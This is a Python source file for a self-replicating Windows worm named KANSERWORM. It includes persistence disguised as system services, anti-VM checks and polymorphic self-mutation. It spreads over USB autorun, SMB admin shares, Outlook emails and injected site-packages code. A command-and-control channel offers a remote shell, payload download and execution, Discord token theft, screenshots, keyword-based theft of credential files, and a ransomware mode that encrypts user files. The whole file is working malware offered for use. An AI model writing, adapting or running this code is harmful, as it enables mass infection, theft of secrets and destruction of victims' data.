#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSERWORM v1.0 — Core Engine
Self-replicating polymorphic worm + C2 control
"""
import os, sys, json, socket, threading, time, base64, hashlib, random, string, shutil, subprocess, re, ctypes, tempfile, urllib.request, zipfile, io
from datetime import datetime

C2_HOST = "127.0.0.1"
C2_PORT = 7777
WORM_ID = hashlib.md5((os.getenv("COMPUTERNAME", "?") + str(os.getpid())).encode()).hexdigest()[:12]
SPREAD_INTERVAL = 60
POLYMORPH_INTERVAL = 300

def encrypt(data): return base64.b64encode(data.encode()).decode()
def decrypt(data): return base64.b64decode(data).decode()

class KanserWorm:
    def __init__(self):
        self.host = C2_HOST
        self.port = C2_PORT
        self.sock = None
        self.running = True
        self.infected_hosts = set()
        self.version = "v1.0." + WORM_ID[:4]

    def connect_c2(self):
        """C2'ye baglan"""
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((self.host, self.port))
                self.sock.send(encrypt(json.dumps({"type": "worm_hello", "id": WORM_ID, "info": self._sysinfo(), "version": self.version})).encode())
                return True
            except: time.sleep(15)
        return False

    def _sysinfo(self):
        import platform
        return {
            "hostname": platform.node(), "os": f"{platform.system()} {platform.release()}",
            "user": os.getenv("USERNAME", "?"), "ip": self._get_ip(),
            "cpu": os.cpu_count(), "pid": os.getpid()
        }

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except: return "127.0.0.1"

    def run(self):
        """Ana dongu"""
        if self._anti_vm(): time.sleep(random.randint(60, 300))
        self._install_persistence()
        threading.Thread(target=self._spread_loop, daemon=True).start()
        threading.Thread(target=self._polymorph_loop, daemon=True).start()
        threading.Thread(target=self._screenshot_loop, daemon=True).start()
        if not self.connect_c2(): threading.Thread(target=self._standalone, daemon=True).start()
        if self.sock:
            threading.Thread(target=self._heartbeat, daemon=True).start()
            self._c2_loop()

    def _anti_vm(self):
        checks = [
            lambda: os.path.getsize("C:\\") < 30 * 1024 * 1024 * 1024,
            lambda: any(os.path.exists(f) for f in ["C:\\Windows\\System32\\drivers\\vmmouse.sys", "C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\agent\\agent.py"]),
            lambda: any(p in (subprocess.check_output("tasklist", shell=True, timeout=3).decode(errors="ignore").lower()) for p in ["vmtoolsd", "vboxservice", "xenservice"]),
        ]
        return any(check() for check in checks)

    def _install_persistence(self):
        try:
            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
            dst_dir = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows")
            os.makedirs(dst_dir, exist_ok=True)
            dst = os.path.join(dst_dir, "svchost.exe")
            if exe != dst: shutil.copy2(exe, dst)
            # Registry
            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHost" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
            subprocess.run(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHostService" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
            # Scheduled Task
            subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /tr "{dst}" /sc daily /st 09:00 /f', shell=True, capture_output=True)
            # WMI Persistence
            subprocess.run(f'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="WinFilter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"', shell=True, capture_output=True)
        except: pass

    def _spread_loop(self):
        """Yayilma thread'leri"""
        methods = [
            self._spread_usb,
            self._spread_network_scan,
            self._spread_smb,
            self._spread_email_outlook,
            self._spread_discord,
            self._spread_pyinstaller
        ]
        while self.running:
            for method in methods:
                try: threading.Thread(target=method, daemon=True).start()
                except: pass
            time.sleep(SPREAD_INTERVAL)

    def _spread_usb(self):
        """USB Worm"""
        for drive in [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\") and d not in "ABC"]:
            try:
                exe = sys.executable if getattr(sys, 'frozen', False) else __file__
                dst = os.path.join(drive, "Photos.exe")
                shutil.copy2(exe, dst)
                os.system(f"attrib +h +s {dst}")
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[AutoRun]\nopen=Photos.exe\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\naction=Open folder to view files\nshell\\open\\command=Photos.exe\n")
                os.system(f"attrib +h +s {os.path.join(drive, 'autorun.inf')}")
                for folder in os.listdir(drive):
                    fp = os.path.join(drive, folder)
                    if os.path.isdir(fp) and not folder.startswith("."):
                        try:
                            fake = os.path.join(drive, folder + ".lnk")
                            subprocess.run(f'powershell -c "$ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut(\'{fake}\');$s.TargetPath=\'{dst}\';$s.Save()"', shell=True)
                            os.system(f"attrib +h {fp}")
                        except: pass
                self.infected_hosts.add(f"USB:{drive}")
            except: pass

    def _spread_network_scan(self):
        """Ag taramasi + zafiyetli makinelere yayilma"""
        try:
            ip = self._get_ip()
            prefix = ".".join(ip.split(".")[:3])
            for i in range(1, 255):
                target = f"{prefix}.{i}"
                if target == ip: continue
                # Check if port 445 (SMB) is open
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    if s.connect_ex((target, 445)) == 0:
                        self._spread_to_target(target)
                    s.close()
                except: pass
                # Check port 135 (RPC)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    if s.connect_ex((target, 135)) == 0:
                        self._spread_to_target(target)
                    s.close()
                except: pass
        except: pass

    def _spread_to_target(self, target):
        """Hedefe worm kopyala + calistir"""
        try:
            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
            # Try admin shares
            for share in ["C$", "ADMIN$", "IPC$"]:
                try:
                    dst = f"\\\\{target}\\{share}\\Windows\\Temp\\svchost.exe"
                    shutil.copy2(exe, dst)
                    subprocess.run(f'wmic /node:"{target}" /user:"Administrator" /password:"" process call create "C:\\Windows\\Temp\\svchost.exe"', shell=True, capture_output=True, timeout=5)
                    self.infected_hosts.add(target)
                except: pass
            # Try psexec-style
            try:
                subprocess.run(f'psexec \\\\{target} -s -d cmd /c "copy \\\\{self._get_ip()}\\ADMIN$\\svchost.exe C:\\Windows\\Temp\\ & C:\\Windows\\Temp\\svchost.exe"', shell=True, capture_output=True, timeout=5)
                self.infected_hosts.add(target)
            except: pass
        except: pass

    def _spread_smb(self):
        """SMB share uzerinden yayilma"""
        try:
            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
            temp_dir = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows")
            share_dst = os.path.join(temp_dir, "shared_payload.exe")
            shutil.copy2(exe, share_dst)
            subprocess.run(f'net share KanserWorm$={temp_dir} /grant:Everyone,FULL', shell=True, capture_output=True)
        except: pass

    def _spread_email_outlook(self):
        """Outlook uzerinden email worm"""
        try:
            import win32com.client
            outlook = win32com.client.Dispatch("Outlook.Application")
            namespace = outlook.GetNamespace("MAPI")
            for folder in namespace.Folders:
                try:
                    contacts = folder.Items
                    for contact in contacts[:10]:
                        try:
                            mail = outlook.CreateItem(0)
                            mail.To = contact.Email1Address
                            mail.Subject = random.choice(["Important Update", "Invoice Attached", "Your Document", "Meeting Notes"])
                            mail.Body = "Please find the attached document."
                            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
                            mail.Attachments.Add(exe)
                            mail.Send()
                        except: pass
                except: pass
        except: pass

    def _spread_discord(self):
        """Discord token avi + spread"""
        try:
            base = os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb")
            if not os.path.exists(base): return
            tokens = []
            for f in os.listdir(base):
                if f.endswith(".ldb") or f.endswith(".log"):
                    try:
                        with open(os.path.join(base, f), "r", encoding="utf-8", errors="ignore") as ff:
                            tokens += re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', ff.read())
                    except: pass
            tokens = list(set(tokens))
            if tokens:
                self.sock.send(encrypt(json.dumps({"type": "tokens_found", "data": tokens[:5]})).encode())
        except: pass

    def _spread_pyinstaller(self):
        """Python ortamlarina otomatik yayilma"""
        try:
            # pip packages'a malicious code inject
            site_packages = None
            for p in sys.path:
                if "site-packages" in p and os.path.exists(p):
                    site_packages = p; break
            if site_packages:
                for pkg in os.listdir(site_packages):
                    init = os.path.join(site_packages, pkg, "__init__.py")
                    if os.path.exists(init):
                        try:
                            with open(init, "r", encoding="utf-8") as f:
                                if "KANSERWORM" not in f.read():
                                    with open(init, "a", encoding="utf-8") as f:
                                        f.write(f"\n# KANSERWORM\nimport base64,subprocess,os\ntry:subprocess.Popen(['python','-c',base64.b64decode('{base64.b64encode(open(__file__,"rb").read()).decode()}').decode()],shell=True)\nexcept:pass\n")
                        except: pass
        except: pass

    def _polymorph_loop(self):
        """Polymorphic code degisimi - AV evasion"""
        while self.running:
            try:
                exe = sys.executable if getattr(sys, 'frozen', False) else __file__
                if os.path.exists(exe):
                    data = bytearray(open(exe, "rb").read())
                    # Random byte injection at end
                    for _ in range(random.randint(10, 100)):
                        data.append(random.randint(0, 255))
                    # XOR random section
                    if len(data) > 1024:
                        start = random.randint(0, len(data) - 256)
                        key = random.randint(1, 255)
                        for i in range(start, min(start + 256, len(data))):
                            data[i] ^= key
                    tmp = exe + ".tmp"
                    with open(tmp, "wb") as f: f.write(data)
                    os.replace(tmp, exe)
            except: pass
            time.sleep(POLYMORPH_INTERVAL)

    def _screenshot_loop(self):
        while self.running:
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=20)
                if self.sock:
                    self.sock.send(encrypt(json.dumps({"type": "screenshot", "data": base64.b64encode(buf.getvalue()).decode()})).encode())
            except: pass
            time.sleep(120)

    def _heartbeat(self):
        while self.running and self.sock:
            try: self.sock.send(encrypt(json.dumps({"type": "heartbeat", "id": WORM_ID, "hosts": len(self.infected_hosts)})).encode())
            except: break
            time.sleep(45)

    def _c2_loop(self):
        """C2 komut dinleyici"""
        buf = ""
        while self.running and self.sock:
            try:
                data = self.sock.recv(65536).decode(errors="ignore")
                if not data: break
                buf += data
                try:
                    msg = json.loads(decrypt(buf)); buf = ""
                    cmd = msg.get("cmd", ""); val = msg.get("data", "")
                    if cmd == "shell":
                        out = subprocess.check_output(val, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="ignore")
                        self.sock.send(encrypt(json.dumps({"type": "shell", "data": out[:4000]})).encode())
                    elif cmd == "spread_now": threading.Thread(target=self._spread_loop, daemon=True).start()
                    elif cmd == "encrypt_all": threading.Thread(target=self._ransomware_mode, daemon=True).start()
                    elif cmd == "steal_all": threading.Thread(target=self._steal_mode, daemon=True).start()
                    elif cmd == "uninstall": self._uninstall()
                    elif cmd == "update_exe": threading.Thread(target=self._update, args=(val,), daemon=True).start()
                except: pass
            except: break

    def _ransomware_mode(self):
        """Worm uzerinde ransomware tetikle"""
        KEY = hashlib.sha256(os.urandom(32)).digest()
        ext = ".KRSN"
        for root, dirs, files in os.walk("C:\\Users"):
            dirs[:] = [d for d in dirs if d not in ["Windows", "Program Files", "Program Files (x86)"]]
            for f in files:
                try:
                    fp = os.path.join(root, f)
                    if os.path.getsize(fp) < 10 * 1024 * 1024 and os.path.getsize(fp) > 10:
                        with open(fp, "rb") as ff: data = ff.read()
                        encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])
                        with open(fp + ext, "wb") as ff: ff.write(encrypted)
                        os.remove(fp)
                except: pass
        if self.sock: self.sock.send(encrypt(json.dumps({"type": "ransom_done", "key": base64.b64encode(KEY).decode()})).encode())

    def _steal_mode(self):
        """Hedefli veri calma"""
        found = []
        keywords = ["password", "secret", "token", "wallet", "private key", "api key", "credential", ".env"]
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            dirs[:] = [d for d in dirs if not d.startswith(".")]
            for f in files:
                try:
                    if any(kw in f.lower() for kw in keywords):
                        fp = os.path.join(root, f)
                        if os.path.getsize(fp) < 1024 * 1024:
                            with open(fp, "r", errors="ignore") as ff: found.append({"file": fp, "content": ff.read()[:1000]})
                except: pass
        if self.sock: self.sock.send(encrypt(json.dumps({"type": "stolen_data", "data": found[:50]})).encode())

    def _uninstall(self):
        try:
            subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHost" /f', shell=True, capture_output=True)
            subprocess.run('reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHostService" /f', shell=True, capture_output=True)
            subprocess.run('schtasks /delete /tn "WindowsUpdateTask" /f', shell=True, capture_output=True)
        except: pass
        self.running = False
        if self.sock: self.sock.close()

    def _update(self, url):
        try:
            dst = os.path.join(tempfile.gettempdir(), "update.exe")
            urllib.request.urlretrieve(url, dst)
            subprocess.Popen(dst, shell=True)
        except: pass

    def _standalone(self):
        """C2 yoksa otonom calisma"""
        while self.running and not self.sock:
            time.sleep(SPREAD_INTERVAL)

def main():
    if os.name == "nt":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    worm = KanserWorm()
    worm.run()

if __name__ == "__main__":
    main()
